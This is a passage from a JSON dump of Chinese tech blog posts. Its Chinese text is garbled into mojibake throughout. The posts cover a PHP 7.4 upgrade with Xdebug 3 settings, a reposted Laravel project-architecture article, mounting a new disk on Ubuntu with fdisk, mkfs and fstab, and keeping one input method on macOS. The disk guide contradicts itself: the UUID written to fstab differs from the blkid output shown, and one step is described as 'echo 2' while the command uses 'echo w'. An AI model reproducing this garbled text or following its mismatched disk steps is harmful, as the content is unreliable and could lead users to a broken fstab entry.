ä¸­é—´é‡åˆ°äº†ä¸€äº›å°é—®é¢˜ï¼Œæ€»ä½“è¿˜ç®—é¡ºåˆ©ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚ èƒŒæ™¯è¯´æ˜æˆ‘å¹¶æ²¡æœ‰ä½¿ç”¨é›†æˆçš„å¼€å‘ç¯å¢ƒï¼Œè€Œæ˜¯å•ç‹¬å®‰è£…æ‰€éœ€çš„5.6ã€7.0ã€7.1ã€7.2ã€7.3 ç‰ˆæœ¬ï¼Œæ‰€ä»¥å‡çº§7.4 ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ä½¿ç”¨brew å®‰è£…å³å¯ï¼š 1$ brew install php@7.4 ä½†æ˜¯è¿™ä¼šå¸¦æ¥ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼šä¹‹å‰é€šè¿‡æºç ç¼–è¯‘å®‰è£…è¿‡çš„æ‰©å±•ï¼Œè¿˜éœ€è¦å†å®‰è£…ä¸€æ¬¡ã€‚ ä½ å¯èƒ½ä¼šé—®ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦å†å®‰è£…ä¸€æ¬¡å‘¢ï¼Ÿç›´æ¥æŠŠphp.ini ä¸­çš„å¼€å¯æ‰©å±•é…æ‹·è´è¿‡å»ä¸å°±å¯ä»¥äº†å—ï¼Ÿ æˆ‘ä»¬æ¥è¯•è¯•è¿™æ ·åšä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ å¯ä»¥çœ‹åˆ° PHP å¹¶æ²¡æœ‰æ­£å¸¸åŠ è½½è¯¥æ‰©å±•ï¼Œè¿™æ˜¯ä¸ºå•¥å‘¢ï¼Ÿ è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦ææ¸…æ¥šï¼Œæºç ç¼–è¯‘å®‰è£…æ˜¯æ€ä¹ˆå›äº‹ã€‚ å½“æˆ‘ä»¬æ‰§è¡Œphpize å‘½ä»¤åï¼Œä¼šæ ¹æ®å½“å‰ç³»ç»Ÿä¿¡æ¯ï¼ˆPHP ç‰ˆæœ¬ï¼‰ç”Ÿæˆå¯¹åº”ç‰ˆæœ¬çš„æ‰©å±•æ–‡ä»¶ã€‚ æ‰€ä»¥PHP7.3 ç¼–è¯‘ç”Ÿæˆçš„æ‰©å±•è‡ªç„¶å°±ä¸èƒ½ç›´æ¥æ‹¿åˆ°PHP 7.4 ä¸­å»ä½¿ç”¨äº†ã€‚ xdebugå¦å¤–æƒ³è¯´ä¸€ä¸‹Xdebug ï¼Œå®ƒæ˜¯æˆ‘ä¸€ç›´åœ¨ä½¿ç”¨çš„ä¸€ä¸ªè°ƒè¯•æ‰©å±•ï¼Œéå¸¸å¼ºå¤§ã€‚ åœ¨PHP å‡èµ·åˆ°7.4 ä¹‹åï¼Œæˆ‘ä¸€å¹¶å®‰è£…äº†æœ€æ–°ç‰ˆçš„Xdebugï¼ˆ3.xï¼‰ï¼Œæ­¤å‰æˆ‘ä¸€ç›´ä½¿ç”¨ 2.x ç‰ˆæœ¬çš„ï¼Œå› ä¸ºç‰ˆæœ¬è·¨åº¦æ¯”è¾ƒå¤§ï¼Œåˆšå¼€å§‹é—®é¢˜æŒºå¤šçš„ï¼Œæ–­ç‚¹æ€»æ˜¯è¿›ä¸å»ã€‚ èµ·åˆæˆ‘è®¤ä¸ºæ˜¯æ–°æ—§é…ç½®ä¸å…¼å®¹ï¼ŒæŒºå¤šå‚æ•°åç§°å‘ç”Ÿäº†å˜åŒ–ï¼Œï¼ˆå…·ä½“å¯ä»¥çœ‹è¿™é‡Œï¼‰ï¼Œå½“æˆ‘æŠŠé…ç½®å…¨éƒ¨åˆ‡æ¢æˆé€‚åº”æ–°ç‰ˆæœ¬ï¼Œè¿˜æ˜¯è¿›ä¸å»ã€‚ åæ¥é˜´å·®é˜³é”™å‡çº§äº†PHPStormï¼Œç»“æœå°±èƒ½è°ƒè¯•äº†â€¦ï¼ˆå‡çº§ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯ 2020.1ï¼‰ é€‚åº”xdebug 3.xçš„é…ç½®å¦‚ä¸‹ï¼š 123456[XDebug]zend_extension&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pecl&#x2F;20190902&#x2F;xdebug.soxdebug.mode &#x3D; debugxdebug.client_host &#x3D; 127.0.0.1xdebug.client_port &#x3D; 9003xdebug.idekey&#x3D;PHPSTORM åªæ˜¯åˆ°æœ€åæˆ‘ä¹Ÿæ²¡æ•´æ˜ç™½åˆ°åº•æ˜¯å•¥åŸå› å¯¼è‡´ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"PHP/ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/categories/PHP/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"ä¸€äº›æ€è€ƒ","slug":"ä¸€äº›æ€è€ƒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"}]},{"title":"ã€è½¬è½½ã€Laravel ä¸­å¤§å‹é¡¹ç›®æ¶æ„","slug":"laravel-medium-and-large-project-architecture","date":"2021-03-30T15:59:36.000Z","updated":"2021-03-30T16:00:43.872Z","comments":true,"path":"laravel-medium-and-large-project-architecture/","link":"","permalink":"https://www.0x2beace.com/laravel-medium-and-large-project-architecture/","excerpt":"åˆå­¦è€…å­¦ä¹  Laravel æ—¶åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä¹–ä¹–çš„å°†ç¨‹å¼å¡«å…¥ MVC æ¶æ„å…§ï¼Œå¯¼è‡´ controller ä¸ model å¼‚å¸¸çš„è‚¥å¤§ï¼Œæ—¥åä¸€æ ·å¾ˆéš¾ç»´æŠ¤ï¼›ä¸€ç§æ˜¯å¸¸å¸¸ä¸çŸ¥é“ç¨‹å¼æ”¹å†™åœ¨å“ªä¸€ä¸ª class å…§è€ŒçŠ¹è±«ä¸æ±ºï¼Œæ¯•ç«Ÿä¼ ç»Ÿ PHP éƒ½æ˜¯ä¸€ä¸ªé¡µé¢ä¸€ä¸ªæ¡£æ¡ˆã€‚æœ¬æ–‡æ•´ç†å‡ºé€‚åˆ Laravel çš„ä¸­å¤§å‹é¡¹ç›®æ¶æ„ï¼Œå…¼å…·å®¹æ˜“ç»´æŠ¤ã€å®¹æ˜“æ‰©å……ä¸å®¹æ˜“é‡å¤ä½¿ç”¨çš„ç‰¹ç‚¹ï¼Œå¹¶ä¸”å®¹æ˜“æµ‹è¯•ã€‚","text":"åˆå­¦è€…å­¦ä¹  Laravel æ—¶åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯ä¹–ä¹–çš„å°†ç¨‹å¼å¡«å…¥ MVC æ¶æ„å…§ï¼Œå¯¼è‡´ controller ä¸ model å¼‚å¸¸çš„è‚¥å¤§ï¼Œæ—¥åä¸€æ ·å¾ˆéš¾ç»´æŠ¤ï¼›ä¸€ç§æ˜¯å¸¸å¸¸ä¸çŸ¥é“ç¨‹å¼æ”¹å†™åœ¨å“ªä¸€ä¸ª class å…§è€ŒçŠ¹è±«ä¸æ±ºï¼Œæ¯•ç«Ÿä¼ ç»Ÿ PHP éƒ½æ˜¯ä¸€ä¸ªé¡µé¢ä¸€ä¸ªæ¡£æ¡ˆã€‚æœ¬æ–‡æ•´ç†å‡ºé€‚åˆ Laravel çš„ä¸­å¤§å‹é¡¹ç›®æ¶æ„ï¼Œå…¼å…·å®¹æ˜“ç»´æŠ¤ã€å®¹æ˜“æ‰©å……ä¸å®¹æ˜“é‡å¤ä½¿ç”¨çš„ç‰¹ç‚¹ï¼Œå¹¶ä¸”å®¹æ˜“æµ‹è¯•ã€‚ ä¸€ä¸ªé¡¹ç›®åªæœ‰ MVC æ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬éœ€è¦æ›´å®Œæ•´çš„é¡¹ç›®æ¶æ„ã€‚ Controller è¿‡äºè‡ƒè‚¿å—RoRçš„å½±å“ï¼Œåˆå­¦è€…å¸¸è®¤ä¸º MVC æ¶æ„å°±æ˜¯ model ,view,controller : Model å°±æ˜¯èµ„æ–™åº“ã€‚ Controller è´Ÿè´£ä¸ HTTP äº¤äº’ï¼Œè°ƒç”¨ model ä¸ viewã€‚ View å°±æ˜¯ HTMLã€‚ å‡å¦‚ä¾ç…§è¿™ä¸ªå®šä¹‰ï¼Œä»¥ä¸‹è¿™äº›éœ€æ±‚æ”¹å†™åœ¨å“ªé‡Œå‘¢ï¼Ÿ å‘é€ Emailï¼Œä½¿ç”¨å¤–éƒ¨ APIã€‚ ä½¿ç”¨ PHP å†™çš„é€»è¾‘ã€‚ ä¾éœ€æ±‚å°†æ˜¾ç¤ºæ ¼å¼ä½œè½¬æ¢ã€‚ ä¾éœ€æ±‚æ˜¯å¦æ˜¾ç¤ºæŸäº›èµ„æ–™ã€‚ ä¾éœ€æ±‚æ˜¾ç¤ºä¸åŒèµ„æ–™ã€‚ å…¶ä¸­ 1, 2 å±äºå•†ä¸šé€»è¾‘ï¼Œè€Œ 3, 4, 5 å±äºæ˜¾ç¤ºé€»è¾‘ï¼Œè‹¥ä¾ç…§ä¸€èˆ¬äººå¯¹ MVC çš„å®šä¹‰ï¼Œmodel æ˜¯èµ„æ–™åº“ï¼Œè€Œ view åˆæ˜¯ HTMLï¼Œä»¥ä¸Šè¿™äº›éœ€æ±‚éƒ½ä¸èƒ½å†™åœ¨ model ä¸ viewï¼Œåªèƒ½å‹‰å¼ºå†™åœ¨ controllerã€‚ å› æ­¤åˆå­¦è€…å¼€å§‹å°†å¤§é‡ç¨‹å¼å†™åœ¨ controllerï¼Œé€ æˆ controller çš„è‚¥å¤§éš¾ä»¥ç»´æŠ¤ã€‚ Model è¿‡äºè‡ƒè‚¿æ—¢ç„¶é€»è¾‘å†™åœ¨ controller ä¸æ–¹ä¾¿ç»´æŠ¤ï¼Œé‚£æˆ‘å°†é€»è¾‘éƒ½å†™åœ¨ model å°±å¥½äº†ï¼Ÿ å½“ä½ å°†é€»è¾‘ä» controller æ¬åˆ° model åï¼Œè™½ç„¶ controller å˜ç˜¦äº†ï¼Œä½†å´è‚¥äº† modelï¼Œmodel ä»åŸæœ¬ä»£è¡¨èµ„æ–™åº“ï¼Œç¾åœ¨å˜æˆè¿˜è¦è´Ÿè´£å•†ä¸šé€»è¾‘ä¸æ˜¾ç¤ºé€»è¾‘ï¼Œç»“æœæ›´æ…˜ã€‚ Model ä»£è¡¨èµ„æ–™åº“å—ï¼ŸæŠŠå®ƒæƒ³æˆæ˜¯ Eloquent classå°±å¥½ï¼Œèµ„æ–™åº“é€»è¾‘åº”è¯¥å†™åœ¨ repository é‡Œï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ Laravel 5 å·²ç»æ²’æœ‰ modelsç›®å½•ï¼ŒEloquent class ä»…ä»…æ˜¯æ”¾åœ¨ app æ ¹ç›®å½•ä¸‹è€Œå·²ã€‚ ä¸­å¤§å‹é¡¹ç›®æ¶æ„é‚£æˆ‘ä»¬æ”¹æ€ä¹ˆå†™å‘¢ï¼Ÿåˆ¥å°†æˆ‘ä»¬çš„æ€ç»´å±€é™åœ¨ MVC å…§ : Model : ä»…å½“æˆ Eloquent classã€‚ Repository : è¾…åŠ© modelï¼Œå¤„ç†èµ„æ–™åº“é€»è¾‘ï¼Œç„¶åæ³¨å…¥åˆ° serviceã€‚ Service : è¾…åŠ© controllerï¼Œå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œç„¶åæ³¨å…¥åˆ° controllerã€‚ Controller : æ¥æ”¶ HTTP requestï¼Œè°ƒç”¨å…¶ä»– serviceã€‚ Presenter : å¤„ç†æ˜¾ç¤ºé€»è¾‘ï¼Œç„¶åæ³¨å…¥åˆ° viewã€‚ View : ä½¿ç”¨ blade å°†èµ„æ–™ ç»‘å®š åˆ° HTMLã€‚ ä¸Šé¢æ¶æ„æˆ‘ä»¬å¯ä»¥å‘ç° MVC æ¶æ„è¿˜åœ¨ï¼Œç”±ä¸ SOLID çš„å•ä¸€èŒè´£åŸå‰‡ä¸ä¾èµ–åè½¬åŸåˆ™: æˆ‘ä»¬å°†èµ„æ–™åº“é€»è¾‘ä» model åˆ†ç¦»å‡ºæ¥ï¼Œç”± repository è¾…åŠ© modelï¼Œå°† model ä¾èµ–æ³¨å…¥è¿› repositoryã€‚æˆ‘ä»¬å°†å•†ä¸šé€»è¾‘ä» controller åˆ†ç¦»å‡ºæ¥ï¼Œç”± service è¾…åŠ© controllerï¼Œå°† service ä¾èµ–æ³¨å…¥è¿› controllerã€‚æˆ‘å€‘å°†æ˜¾ç¤ºé€»è¾‘ä» view åˆ†ç¦»å‡ºä¾†ï¼Œç”± presenter è¾…åŠ© viewï¼Œå°† presenter ä¾èµ–æ³¨å…¥è¿› viewã€‚ å»ºç«‹ç›®å½•åœ¨ app ç›®å½•ä¸‹å»ºç«‹ Repositoriesï¼ŒServices ä¸ Presenters ç›®å½•ã€‚ åˆ¥å®³æ€•å»ºç«‹ç›®å½•ï¼ï¼ åˆ¥å®³æ€•åœ¨ Laravel é¢„è®¾ç›®å½•ä»¥å¤–å»ºç«‹çš„å…¶ä»–ç›®å½•ï¼Œæ ¹æ® SOLID çš„å•ä¸€èŒè´£åŸåˆ™ï¼Œclass åŠŸèƒ½è¶Šå¤šï¼Œè´£ä»»ä¹Ÿè¶Šå¤šï¼Œå› æ­¤è¶Šè¿åå•ä¸€èŒè´£åŸåˆ™ï¼Œæ‰€ä»¥ä½ åº”è¯¥å°†ä½ çš„ç¨‹å¼åˆ†å‰²æˆæ›´å°çš„éƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰å®ƒä¸“å±çš„åŠŸèƒ½ï¼Œè€Œä¸æ˜¯ä¸€ä¸ª class åŠŸèƒ½åŒ…å±±åŒ…æµ·ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ä¸‡èƒ½ç±»åˆ«ï¼Œæ‰€ä»¥æ•´ä¸ªæ–¹æ¡ˆä¸åº”è¯¥åªæœ‰ MVC ä¸‰ä¸ªéƒ¨åˆ†ï¼Œæ”¾æ‰‹æ ¹æ®ä½ çš„éœ€æ±‚å»ºç«‹é€‚å½“çš„ç›®å½•ï¼Œå¹¶å°†é€‚å½“çš„ class æ”¾åˆ°è¯¥ç›®å½•ä¸‹ï¼Œåªè¦æˆ‘ä»¬çš„ class æœ‰ namespace å¸®æˆ‘ä»¬åˆ†ç±»å³å¯ã€‚ Repositoryç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œå°† repository ç‹¬ç«‹æˆä¸“æ–‡è®¨è®ºï¼Œè¯·å‚è€ƒå¦‚ä½•ä½¿ç”¨ Repository æ¨¡å¼? Serviceç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œå°† service ç‹¬ç«‹æˆä¸“æ–‡è®¨è®ºï¼Œè¯·å‚è€ƒå¦‚ä½•ä½¿ç”¨ Service æ¨¡å¼? Presenterç”±äºç¯‡å¹…çš„å…³ç³»ï¼Œå°† presenter ç‹¬ç«‹æˆä¸“æ–‡è®¨è®ºï¼Œè¯·å‚è€ƒå¦‚ä½•ä½¿ç”¨ Presenter æ¨¡å¼? å•å…ƒæµ‹è¯•ç”±äºç°åœ¨ modelã€viewã€controller çš„ç›¸ä¾ç‰©ä»¶éƒ½å·²ç»æ‹†å¼€ï¼Œä¹Ÿéƒ½ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼Œå› æ­¤æ¯ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥å•ç‹¬çš„åšå•å…ƒæµ‹è¯•ï¼Œå¦‚è¦æµ‹è¯• serviceï¼Œå°±å°† repository åŠ ä»¥ mockï¼Œä¹Ÿå¯ä»¥å°†å…¶ä»– service åŠ ä»¥ mockã€‚ Presenter ä¹Ÿå¯ä»¥å•ç‹¬è·‘å•å…ƒæµ‹è¯•ï¼Œå°†å…¶ä»– service åŠ ä»¥ mockï¼Œä¸ä¸€å®šè¦è·‘éªŒæ”¶æµ‹è¯•æ‰èƒ½æµ‹è¯•æ˜¾ç¤ºé€»è¾‘ã€‚ Conclusionæœ¬æ–‡è°ˆåˆ°çš„æ¶æ„åªæ˜¯å¼€å§‹å¼€å§‹ï¼Œä½ å¯ä»¥ä¾ç…§å®é™…éœ€æ±‚å¢åŠ æ›´å¤šçš„ç›®å½•ä¸ classï¼Œå½“ä½ å‘ç°ä½ çš„ MVC è¿å SOLID åŸåˆ™æ—¶ï¼Œå°±å¤§èƒ†çš„å°† class ä» MVC æ‹†å¼€é‡æ„ï¼Œç„¶åä¾ç…§ä»¥ä¸‹æ‰‹æ³• : å»ºç«‹æ–°çš„ class æˆ– interfaceã€‚ å°†ç›¸ä¾ç‰©ä»¶ä¾èµ–æ³¨å…¥åˆ° classã€‚ åœ¨ class å…§å¤„ç†ä»–çš„èŒè´£ã€‚ å°† class æˆ– interface æ³¨å…¥åˆ° controller æˆ– viewã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œåå°”è¡—ä¹‹çŒ«ã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_24935119/article/details/89656569","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Linux å¦‚ä½•æŒ‚è½½æ–°ç¡¬ç›˜","slug":"how-to-mount-a-new-hard-disk-in-linux","date":"2021-03-25T14:40:48.000Z","updated":"2021-03-25T14:42:08.365Z","comments":true,"path":"how-to-mount-a-new-hard-disk-in-linux/","link":"","permalink":"https://www.0x2beace.com/how-to-mount-a-new-hard-disk-in-linux/","excerpt":"å¦‚ä½•å°†ä¸€å—æ–°çš„ç¡¬ç›˜æŒ‚è½½åˆ°Linux æ“ä½œç³»ç»Ÿå‘¢ï¼Ÿ","text":"å¦‚ä½•å°†ä¸€å—æ–°çš„ç¡¬ç›˜æŒ‚è½½åˆ°Linux æ“ä½œç³»ç»Ÿå‘¢ï¼Ÿ ä¸‹é¢ä»¥Ubuntu 18.04çš„å‘è¡Œç‰ˆä½œä¸ºæ¼”ç¤ºã€‚ é¦–å…ˆæŸ¥çœ‹ç³»ç»Ÿå½“å‰ç¡¬ç›˜åˆ†é…æƒ…å†µï¼š 1$ cd &#x2F;dev &amp;&amp; ls sd* -al é»˜è®¤æƒ…å†µä¸‹ï¼Œç³»ç»Ÿç¡¬ç›˜æ ‡è®°ä¸º/dev/sdaï¼Œsda1ã€sda2è¿™äº›è¡¨ç¤ºå¯¹åº”ç¡¬ç›˜ä¸‹çš„åˆ†åŒºåç§°ã€‚ æŸ¥çœ‹å½“å‰ç³»ç»Ÿç¡¬ç›˜æŒ‚è½½æƒ…å†µï¼š 1$ df -h å¯ä»¥åˆ°çœ‹ï¼Œè¯¥ç³»ç»Ÿå½“å‰ä¸€å…±æŒ‚è½½äº†ä¸¤å—ç¡¬ç›˜ï¼Œåˆ†åˆ«æ˜¯ï¼š åˆ†åŒºåç§°ä¸º /dev/sda2çš„ç³»ç»Ÿç›˜ 10Gï¼ŒæŒ‚è½½ç‚¹ä¸º/ã€‚ åˆ†åŒºåç§°ä¸º /dev/sdb1çš„ä¸´æ—¶ç›˜ 2.5Gï¼ŒæŒ‚è½½ç‚¹ä¸º/mydataã€‚ ç°åœ¨æ¥ä¸ºè¯¥ç³»ç»Ÿæ·»åŠ ç¬¬ä¸‰å—ç¡¬ç›˜ï¼Œå¹¶å°è¯•æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ã€‚ VirtualBox æ·»åŠ ç£ç›˜æ·»åŠ ç¡¬ç›˜ä¹‹å‰ï¼Œéœ€è¦å…ˆå°†æœºå™¨ç»™åœæ‰ï¼Œå³é”®è®¾ç½®ï¼Œç‚¹å‡»å­˜å‚¨ åˆ›å»ºè™šæ‹Ÿç›˜ï¼š æŒ‰ç…§é»˜è®¤é€‰æ‹©VDI å°±å¥½ï¼š æ ¹æ®è‡ªèº«æƒ…å†µï¼Œé€‰æ‹©åŠ¨æ€åˆ†é…æˆ–è€…å›ºå®šå¤§å° è¿™é‡Œé€‰æ‹©åˆ†é…ä¸‰ä¸ªGï¼Œç„¶åç‚¹å‡»åˆ›å»ºã€‚ å°†æ–°ç¡¬ç›˜åŠ å…¥è¿›æ¥ï¼Œç„¶åå¯åŠ¨æœºå™¨ã€‚ åˆ†åŒºè¿æ¥ä¸Šæœºå™¨ä¹‹åï¼Œå†æ¬¡æŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿç¡¬ç›˜ï¼š å¯ä»¥çœ‹åˆ°è¿™æ¬¡å¤šäº†ä¸€ä¸ªå«åšsdc çš„ç¡¬ç›˜ï¼Œé¦–å…ˆéœ€è¦å¯¹è¯¥ç¡¬ç›˜è¿›è¡Œåˆ†åŒºï¼Œç„¶åæ‰èƒ½æŒ‚è½½ã€‚ è¿™é‡Œæˆ‘åªéœ€è¦æ–°å¢ä¸€ä¸ªä¸»åˆ†åŒºï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 1$ (echo n; echo p; echo 1; echo ; echo ; echo w) | sudo fdisk &#x2F;dev&#x2F;sdc è¿™æ¡å‘½ä»¤æœ€ç»ˆä¼šåšä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š echo n æ–°å¢åˆ†åŒº echo p æ–°å»ºä¸»åˆ†åŒº echo 1 æ–°å¢ä¸€ä¸ªä¸»åˆ†åŒº echo è¡¨ç¤ºã€å›è½¦ã€ç¡®å®š echo 2 å†™å…¥å¹¶é€€å‡º å°†ä»¥ä¸Šè¾“å‡ºä½œä¸ºè¾“å‡ºé€šè¿‡ç®¡é“ç¬¦ä¼ é€’ç»™fdiskå‘½ä»¤ /dev/sdc è¡¨ç¤ºéœ€è¦åˆ†åŒºçš„ç¡¬ç›˜ å°†æ–‡ä»¶ç³»ç»Ÿå†™å…¥åˆ†åŒºï¼š 1sudo mkfs -t ext4 &#x2F;dev&#x2F;sdc1 æŒ‚è½½ç¡¬ç›˜å°†æ–°ç¡¬ç›˜æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ï¼š 1$ sudo mkdir &#x2F;boo &amp;&amp; sudo mount &#x2F;dev&#x2F;sdc1 &#x2F;boo å†æ¬¡ä½¿ç”¨df -hå‘½ä»¤æŸ¥çœ‹ç£ç›˜æƒ…å†µï¼Œå¯ä»¥åˆ°çœ‹æ–°ç¡¬ç›˜å·²ç»æŒ‚è½½åˆ°æŒ‡å®šç›®å½•ä¸‹äº†ã€‚ æœ€åè®°å¾—è®¾ç½®å¼€æœºæŒ‚è½½ï¼Œä½¿ç”¨blkid å‘½ä»¤è·å–ç¡¬ç›˜UUIDï¼š 1$ sudo -i blkid è¾“å‡ºå†…å®¹ç±»ä¼¼ï¼š 1&#x2F;dev&#x2F;sdc1: UUID&#x3D;&quot;f8025940-19bc-4943-9711-b431f478838e&quot; TYPE&#x3D;&quot;ext4&quot; PARTUUID&#x3D;&quot;d746a3a1-01&quot; ç¼–è¾‘/etc/fstab æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 1UUID&#x3D;9da67a01-aaae-4979-93fd-9916f010731a &#x2F;boo ext4 defaults 0 0 è‡³æ­¤å°±å®Œæˆäº†ç¡¬ç›˜æŒ‚è½½çš„æ‰€æœ‰æ“ä½œäº†ã€‚ å‚è€ƒé“¾æ¥ è™šæ‹ŸæœºVirtualBoxæ€ä¹ˆæ·»åŠ æ–°çš„è™šæ‹Ÿç¡¬ç›˜ Azure: ç»™ ubuntu è™šæœºæŒ‚è½½æ•°æ®ç›˜","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Ubuntu","slug":"Linux/Ubuntu","permalink":"https://www.0x2beace.com/categories/Linux/Ubuntu/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac å¦‚ä½•åªä¿ç•™ä¸€ä¸ªè¾“å…¥æ³•","slug":"how-to-keep-only-one-input-method-on-mac","date":"2021-03-20T01:27:00.000Z","updated":"2021-03-21T03:33:10.032Z","comments":true,"path":"how-to-keep-only-one-input-method-on-mac/","link":"","permalink":"https://www.0x2beace.com/how-to-keep-only-one-input-method-on-mac/","excerpt":"macOS é»˜è®¤è‡ªå¸¦çš„æ˜¯è‹±æ–‡è¾“å…¥æ³•ï¼Œè™½ç„¶ä¹Ÿæœ‰ç®€ä½“ä¸­æ–‡ï¼Œä¸è¿‡è¯åº“ä¸ä¸°å¯Œï¼Œä¸å¤ªå¥½ç”¨ã€‚ä¸€èˆ¬ä¼šé€‰æ‹©å®‰è£…ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„è¾“å…¥æ³•ï¼Œè¿™æ—¶å°±ä¼šæœ‰ä¸¤ä¸ªè¾“å…¥æ³•å…±å­˜äº†ã€‚","text":"macOS é»˜è®¤è‡ªå¸¦çš„æ˜¯è‹±æ–‡è¾“å…¥æ³•ï¼Œè™½ç„¶ä¹Ÿæœ‰ç®€ä½“ä¸­æ–‡ï¼Œä¸è¿‡è¯åº“ä¸ä¸°å¯Œï¼Œä¸å¤ªå¥½ç”¨ã€‚ä¸€èˆ¬ä¼šé€‰æ‹©å®‰è£…ä¸€ä¸ªç¬¬ä¸‰æ–¹çš„è¾“å…¥æ³•ï¼Œè¿™æ—¶å°±ä¼šæœ‰ä¸¤ä¸ªè¾“å…¥æ³•å…±å­˜äº†ã€‚ å¸¸å¸¸ä¼šé‡åˆ°çš„ä¸€ä¸ªç—›ç‚¹å°±æ˜¯å¤šåº”ç”¨åˆ‡æ¢æ—¶ï¼Œä¸‹ä¸€ä¸ªè¾“å…¥æ³•æ€»æ˜¯ä¸ç¡®å®šï¼Œæœ‰æ—¶å€™æ˜¯ä¸­æ–‡æœ‰æ—¶å€™æ˜¯è‹±æ–‡ã€‚ ç³»ç»Ÿè¾“å…¥æ³•åˆ‡æ¢çš„å¿«æ·æ–¹å¼æ˜¯Control + Spaceï¼Œè€Œè½æ ¼è¾“å…¥æ³•åˆ‡æ¢ä¸­è‹±æ–‡åˆæ˜¯Shiftï¼Œè¿™å°±å¯¼è‡´æ€»æ˜¯éœ€è¦æ¥å›åˆ‡æ¢ï¼Œè¿™ä¸€ç‚¹å°±å¾ˆçƒ¦ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœåªä¿ç•™ä¸€ä¸ªè¾“å…¥æ³•ï¼Œé‚£å°±ä¸ä¼šæœ‰è¿™ç§å›°æ‰°äº†ã€‚ ä½†æ˜¯ç³»ç»Ÿå¹¶ä¸å…è®¸æˆ‘ä»¬åˆ é™¤é»˜è®¤çš„è‹±æ–‡è¾“å…¥æ³•ï¼Œä¸è¿‡å¯ä»¥ä¸€äº›å°æ‰‹æ®µæ¥è¾¾åˆ°ç›®çš„ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š åˆ é™¤å¤šä½™çš„è¾“å…¥æ³•ï¼Œåªä¿ç•™é»˜è®¤çš„è‹±æ–‡è¾“å…¥æ³•å’Œæ­£åœ¨ä½¿ç”¨çš„è¾“å…¥æ³• æŠŠå½“å‰è¾“å…¥æ³•åˆ‡æ¢åˆ°é»˜è®¤çš„è‹±æ–‡è¾“å…¥æ³• æŠŠ~/Library/Preferences/è·¯å¾„ä¸‹çš„com.apple.HIToolbox.plistæ–‡ä»¶æ‹·è´åˆ°æ¡Œé¢ï¼Œç”¨Xcode æ‰“å¼€ï¼Œæ‰¾åˆ°å¹¶åˆ é™¤AppleEnabledInputSourcesä¸­KeyboardLayout Nameä¸ºUS é‚£ä¸€é¡¹ï¼Œç„¶åä¿å­˜ã€‚ ç”¨ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢~/Library/Preferences/è·¯å¾„ä¸‹æ–‡ä»¶ é‡å¯ç”µè„‘å³å¯ å‚è€ƒé“¾æ¥ åˆ é™¤macOSè‡ªå¸¦çš„è‹±æ–‡è¾“å…¥æ³•","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"},{"name":"Skill","slug":"Mac/Skill","permalink":"https://www.0x2beace.com/categories/Mac/Skill/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Jenkins + Gitlab 